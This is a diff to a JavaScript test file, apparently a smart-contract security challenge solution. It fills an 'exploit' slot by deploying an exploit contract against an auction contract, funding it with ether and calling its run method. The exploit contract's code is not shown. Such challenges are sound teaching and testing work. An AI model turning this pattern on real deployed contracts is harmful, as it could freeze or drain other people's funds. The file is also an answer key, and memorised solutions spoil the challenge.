@@ -24,6 +24,22 @@ describe('[UNSTOPPABLE AUCTION EXPLOIT]', async function () {
     it('Exploit', async function () {
         // YOUR EXPLOIT HERE
 
+        let exploit = await (
+            await ethers.getContractFactory('UnstoppableAuctionExploit', deployer)
+        ).deploy(this.auction.address)
+        
+        
+        let tx = {
+            to: exploit.address,
+            value: ethers.utils.parseEther("0.001"),
+            gasLimit: 50000
+        }
+    
+        await attacker.sendTransaction(tx)
+
+        
+        await exploit.connect(attacker).run();
+        
     })
 
     after(async function () {
